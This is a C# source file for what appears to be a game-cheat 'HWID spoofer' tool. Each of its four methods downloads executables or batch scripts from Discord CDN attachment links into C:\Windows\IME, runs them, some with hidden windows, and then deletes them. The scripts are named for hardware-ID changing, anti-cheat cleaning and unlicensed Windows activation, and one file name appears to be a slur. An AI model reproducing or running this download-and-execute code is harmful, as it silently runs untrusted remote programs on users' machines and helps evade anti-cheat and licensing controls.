using System.Diagnostics;
using System.IO;
using System.Net;

namespace KeyAuth;

internal class Spoofer
{
	public static void Spoof()
	{
		WebClient webClient = new WebClient();
		string text = "C:\\Windows\\IME\\HWID-Changer.exe";
		string text2 = "C:\\Windows\\IME\\HWID-Changer.runtimeconfig.json";
		string text3 = "C:\\Windows\\IME\\HWID-Changer.dll";
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/1050525202095800380/1050526042680459394/HWID-Changer.exe", text);
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/1050525202095800380/1050527129328168970/HWID-Changer.runtimeconfig.json", text2);
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/1050525202095800380/1050526805620170822/HWID-Changer.dll", text3);
		Process process = new Process();
		process.StartInfo.FileName = "cmd.exe";
		process.StartInfo.UseShellExecute = true;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process = Process.Start(text);
		process.WaitForExit();
		File.Delete(text);
		File.Delete(text2);
		File.Delete(text3);
	}

	public static void Clean()
	{
		WebClient webClient = new WebClient();
		string text = "C:\\Windows\\IME\\applecleaner.exe";
		string text2 = "C:\\Windows\\IME\\neger.bat";
		string text3 = "C:\\Windows\\IME\\eac_cleaner_2.bat";
// use at own risk	webClient.DownloadFile("https://cdn.discordapp.com/attachments/1033861004901240956/1047985011632119898/applecleaner.exe", text);
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/1048738454449688659/1050513422573391902/neger.bat", text2);
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/1048738454449688659/1050513422124580954/eac_cleaner_2.bat", text3);
		Process process = new Process();
		Process process2 = new Process();
		Process process3 = new Process();
		process = Process.Start(text);
		process.WaitForExit();
		process2 = Process.Start(text2);
		process2.WaitForExit();
		process3 = Process.Start(text3);
		process3.WaitForExit();
		File.Delete(text);
		File.Delete(text2);
		File.Delete(text3);
	}

	public static void Serials()
	{
		WebClient webClient = new WebClient();
		string text = "C:\\Windows\\IME\\diocane.cmd";
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/1048738454449688659/1050513608129388595/lite_checkere.bat", text);
		Process process = new Process();
		process.StartInfo.FileName = "cmd.exe";
		process.StartInfo.UseShellExecute = true;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process = Process.Start(text);
		process.WaitForExit();
		File.Delete(text);
	}

	public static void Windows()
	{
		WebClient webClient = new WebClient();
		string text = "C:\\Windows\\IME\\HWID_Activation.cmd";
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/1048738454449688659/1050513718007574578/HWID_Activation.bat", text);
		Process process = new Process();
		process.StartInfo.FileName = "cmd.exe";
		process.StartInfo.UseShellExecute = true;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process = Process.Start(text);
		process.WaitForExit();
		File.Delete(text);
	}
}
